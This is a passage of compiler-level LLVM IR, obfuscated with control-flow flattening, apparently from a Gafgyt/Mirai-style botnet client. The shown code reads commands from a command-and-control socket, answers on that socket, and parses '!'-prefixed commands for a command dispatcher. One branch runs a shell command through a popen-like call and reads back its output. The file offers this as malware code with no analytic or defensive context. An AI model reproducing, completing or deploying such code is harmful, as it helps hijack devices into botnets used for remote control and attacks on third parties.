  %141 = zext i32 %140 to i64
  %142 = getelementptr inbounds i32, i32* %138, i64 %141
  store i32 0, i32* %142, align 4
  %143 = load i64, i64* @numpids, align 8
  %144 = add i64 %143, -1
  store i64 %144, i64* @numpids, align 8
  %145 = load i64, i64* @numpids, align 8
  %146 = add i64 %145, 1
  %147 = mul i64 %146, 4
  %148 = call noalias i8* @malloc(i64 %147) #2
  %149 = bitcast i8* %148 to i32*
  store i32* %149, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 -554891159, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %14, align 4
  %152 = zext i32 %151 to i64
  %153 = load i64, i64* @numpids, align 8
  %154 = icmp ult i64 %152, %153
  %155 = select i1 %154, i32 -41531540, i32 218359516
  store i32 %155, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32*, i32** @pids, align 8
  %158 = load i32, i32* %14, align 4
  %159 = zext i32 %158 to i64
  %160 = getelementptr inbounds i32, i32* %157, i64 %159
  %161 = load i32, i32* %160, align 4
  %162 = load i32*, i32** %13, align 8
  %163 = load i32, i32* %14, align 4
  %164 = zext i32 %163 to i64
  %165 = getelementptr inbounds i32, i32* %162, i64 %164
  store i32 %161, i32* %165, align 4
  store i32 355709196, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i32, i32* %14, align 4
  %168 = add i32 %167, 1
  store i32 %168, i32* %14, align 4
  store i32 -554891159, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32*, i32** @pids, align 8
  %171 = bitcast i32* %170 to i8*
  call void @free(i8* %171) #2
  %172 = load i32*, i32** %13, align 8
  store i32* %172, i32** @pids, align 8
  store i32 -515011511, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  store i32 291672753, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i32, i32* %12, align 4
  %176 = add nsw i32 %175, 1
  store i32 %176, i32* %12, align 4
  store i32 -906259887, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %11, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %179
  store i8 0, i8* %180, align 1
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %181)
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %183 = call i8* @strstr(i8* %182, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %185 = icmp eq i8* %183, %184
  %186 = select i1 %185, i32 -2097483566, i32 664845129
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i32, i32* @mainCommSock, align 4
  %189 = call i32 (i32, i8*, ...) @sockprintf(i32 %188, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.121, i32 0, i32 0))
  store i32 -1327040798, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %192 = call i8* @strstr(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #10
  %193 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %194 = icmp eq i8* %192, %193
  %195 = select i1 %194, i32 -1345243617, i32 -342134288
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:197:                                    ; preds = %loopEntry
  %198 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %198, i8** %15, align 8
  %199 = load i8*, i8** %15, align 8
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 33
  %203 = select i1 %202, i32 1683235520, i32 -1526787958
  store i32 %203, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %15, align 8
  %206 = getelementptr inbounds i8, i8* %205, i64 1
  store i8* %206, i8** %16, align 8
  store i32 1977123322, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %16, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp ne i32 %210, 32
  %212 = select i1 %211, i32 9971107, i32 1483936363
  store i32 %212, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8*, i8** %16, align 8
  %215 = load i8, i8* %214, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp ne i32 %216, 0
  store i32 1483936363, i32* %switchVar
  store i1 %217, i1* %.reg2mem3
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %219 = select i1 %.reload4, i32 520969800, i32 -1948805710
  store i32 %219, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %16, align 8
  %222 = getelementptr inbounds i8, i8* %221, i32 1
  store i8* %222, i8** %16, align 8
  store i32 1977123322, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %16, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 0
  %228 = select i1 %227, i32 1261818293, i32 665503327
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 -1327040798, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = load i8*, i8** %16, align 8
  store i8 0, i8* %231, align 1
  %232 = load i8*, i8** %15, align 8
  %233 = getelementptr inbounds i8, i8* %232, i64 1
  store i8* %233, i8** %16, align 8
  %234 = load i8*, i8** %15, align 8
  %235 = load i8*, i8** %16, align 8
  %236 = call i64 @strlen(i8* %235) #10
  %237 = getelementptr inbounds i8, i8* %234, i64 %236
  %238 = getelementptr inbounds i8, i8* %237, i64 2
  store i8* %238, i8** %15, align 8
  store i32 -272992040, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i8*, i8** %15, align 8
  %241 = load i8*, i8** %15, align 8
  %242 = call i64 @strlen(i8* %241) #10
  %243 = sub i64 %242, 1
  %244 = getelementptr inbounds i8, i8* %240, i64 %243
  %245 = load i8, i8* %244, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 10
  %248 = select i1 %247, i32 266006739, i32 734969787
  store i32 %248, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8*, i8** %15, align 8
  %251 = load i8*, i8** %15, align 8
  %252 = call i64 @strlen(i8* %251) #10
  %253 = sub i64 %252, 1
  %254 = getelementptr inbounds i8, i8* %250, i64 %253
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 13
  store i32 266006739, i32* %switchVar
  store i1 %257, i1* %.reg2mem5
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %259 = select i1 %.reload6, i32 -1530050047, i32 346104963
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load i8*, i8** %15, align 8
  %262 = load i8*, i8** %15, align 8
  %263 = call i64 @strlen(i8* %262) #10
  %264 = sub i64 %263, 1
  %265 = getelementptr inbounds i8, i8* %261, i64 %264
  store i8 0, i8* %265, align 1
  store i32 -272992040, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i8*, i8** %15, align 8
  store i8* %267, i8** %17, align 8
  store i32 -669025417, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8*, i8** %15, align 8
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp ne i32 %271, 32
  %273 = select i1 %272, i32 -1516067713, i32 -1420817286
  store i32 %273, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8*, i8** %15, align 8
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp ne i32 %277, 0
  store i32 -1420817286, i32* %switchVar
  store i1 %278, i1* %.reg2mem7
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %280 = select i1 %.reload8, i32 1729263994, i32 -1324379515
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %15, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %15, align 8
  store i32 -669025417, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i8*, i8** %15, align 8
  store i8 0, i8* %285, align 1
  %286 = load i8*, i8** %15, align 8
  %287 = getelementptr inbounds i8, i8* %286, i32 1
  store i8* %287, i8** %15, align 8
  %288 = load i8*, i8** %17, align 8
  store i8* %288, i8** %18, align 8
  store i32 -1565153823, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i8*, i8** %18, align 8
  %291 = load i8, i8* %290, align 1
  %292 = icmp ne i8 %291, 0
  %293 = select i1 %292, i32 -1741332621, i32 432835933
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i8*, i8** %18, align 8
  %296 = load i8, i8* %295, align 1
  %297 = zext i8 %296 to i32
  %298 = call i32 @toupper(i32 %297) #10
  %299 = trunc i32 %298 to i8
  %300 = load i8*, i8** %18, align 8
  store i8 %299, i8* %300, align 1
  %301 = load i8*, i8** %18, align 8
  %302 = getelementptr inbounds i8, i8* %301, i32 1
  store i8* %302, i8** %18, align 8
  store i32 -1565153823, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8*, i8** %17, align 8
  %305 = call i32 @strcmp(i8* %304, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0)) #10
  %306 = icmp eq i32 %305, 0
  %307 = select i1 %306, i32 489148780, i32 5203456
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = call i32 @listFork()
  %310 = icmp ne i32 %309, 0
  %311 = select i1 %310, i32 874750669, i32 1439908448
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  store i32 -1327040798, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %314, i8 0, i64 1024, i32 16, i1 false)
  %315 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %316 = load i8*, i8** %15, align 8
  %317 = call i32 (i8*, i8*, ...) @szprintf(i8* %315, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i32 0, i32 0), i8* %316)
  %318 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %319 = call i32 @fdpopen(i8* %318, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0))
  store i32 %319, i32* %20, align 4
  store i32 -2045394624, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %322 = load i32, i32* %20, align 4
  %323 = call i8* @fdgets(i8* %321, i32 1024, i32 %322)
  %324 = icmp ne i8* %323, null
  %325 = select i1 %324, i32 100691880, i32 -1048168082
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %327)
  %328 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %328, i8 0, i64 1024, i32 16, i1 false)
  %329 = call i32 @sleep(i32 1)
  store i32 -2045394624, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i32, i32* %20, align 4
  %332 = call i32 @fdpclose(i32 %331)
  call void @exit(i32 0) #14
  unreachable

; <label>:333:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  %334 = load i8*, i8** %15, align 8
  %335 = call i8* @strtok(i8* %334, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %335, i8** %23, align 8
  %336 = load i8*, i8** %17, align 8
  %337 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %336, i8** %337, align 16
  store i32 1272353848, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i8*, i8** %23, align 8
  %340 = icmp ne i8* %339, null
  %341 = select i1 %340, i32 -658861114, i32 -1663315260
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i8*, i8** %23, align 8
  %344 = load i8, i8* %343, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp ne i32 %345, 10
  %347 = select i1 %346, i32 1393862254, i32 1984810590
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i8*, i8** %23, align 8
  %350 = call i64 @strlen(i8* %349) #10
  %351 = add i64 %350, 1
  %352 = call noalias i8* @malloc(i64 %351) #2
  %353 = load i32, i32* %22, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %354
  store i8* %352, i8** %355, align 8
  %356 = load i32, i32* %22, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %357
  %359 = load i8*, i8** %358, align 8
  %360 = load i8*, i8** %23, align 8
  %361 = call i64 @strlen(i8* %360) #10
  %362 = add i64 %361, 1
  call void @llvm.memset.p0i8.i64(i8* %359, i8 0, i64 %362, i32 1, i1 false)
  %363 = load i32, i32* %22, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %364
  %366 = load i8*, i8** %365, align 8
  %367 = load i8*, i8** %23, align 8
  %368 = call i8* @strcpy(i8* %366, i8* %367) #2
  %369 = load i32, i32* %22, align 4
  %370 = add nsw i32 %369, 1
  store i32 %370, i32* %22, align 4
  store i32 1984810590, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %372, i8** %23, align 8
  store i32 1272353848, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i32, i32* %22, align 4
  %375 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %374, i8** %375)
  %376 = load i32, i32* %22, align 4
  %377 = icmp sgt i32 %376, 1
  %378 = select i1 %377, i32 -1301145199, i32 817426421
  store i32 %378, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  store i32 1237657712, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load i32, i32* %24, align 4
  %382 = load i32, i32* %22, align 4
  %383 = icmp slt i32 %381, %382
  %384 = select i1 %383, i32 1465156894, i32 1390530810
  store i32 %384, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %24, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %387
  %389 = load i8*, i8** %388, align 8
  call void @free(i8* %389) #2
  store i32 -1753277369, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %24, align 4
  %392 = add nsw i32 %391, 1
  store i32 %392, i32* %24, align 4
  store i32 1237657712, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  store i32 817426421, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  store i32 -1526787958, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  store i32 -1327040798, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  store i32 627580243, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i32, i32* %3, align 4
  ret i32 %398

loopEnd:                                          ; preds = %396, %395, %394, %393, %390, %385, %380, %379, %373, %371, %348, %342, %338, %333, %326, %320, %313, %312, %308, %303, %294, %289, %284, %281, %279, %274, %268, %266, %260, %258, %249, %239, %230, %229, %223, %220, %218, %213, %207, %204, %197, %190, %187, %177, %174, %173, %169, %166, %156, %150, %137, %134, %123, %117, %114, %105, %99, %98, %92, %88, %86, %82, %78, %77, %75, %74, %73, %71, %70, %66, %61, %57, %first, %switchDefault
  br label %loopEntry
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146482628}
!2 = !{i32 -2146481937}
!3 = !{i32 -2146481188}
!4 = !{i32 -2146480365}
!5 = !{i32 -2146479443}
!6 = !{i32 -2146478060}
